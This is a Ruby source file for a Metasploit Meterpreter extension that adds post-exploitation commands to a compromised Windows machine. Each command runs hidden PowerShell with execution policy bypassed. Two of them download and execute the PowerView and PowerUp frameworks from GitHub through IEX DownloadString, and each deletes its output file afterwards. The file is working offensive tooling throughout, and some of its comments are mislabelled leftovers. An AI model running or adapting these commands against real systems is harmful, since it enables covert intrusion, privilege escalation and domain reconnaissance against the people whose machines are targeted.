# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The password database portion of the privilege escalation extension.
#
###
class Console::CommandDispatcher::Priv::PowerShell

  Klass = Console::CommandDispatcher::Priv::PowerShell

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "power_shell" => "Execute a powershell command.",
      "power_view"  => "Download and execute Veil's PowerView Framework",
      "power_up"    => "Download and execute the PowerUp Framework"
    }
  end

  #
  # Name for this dispatcher.
  #
  def name
    "Interactive Powershell"
  end

  #
  # Displays the contents of the SAM database
  #
  def cmd_power_shell(*args)    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client... (~10 seconds)")
    sleep(10)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_view(*args)    
    link = 'https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client... (~10 seconds)")
    sleep(10)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_up(*args)
    link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client... (~10 seconds)")
    sleep(10)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

end

end
end
end
end

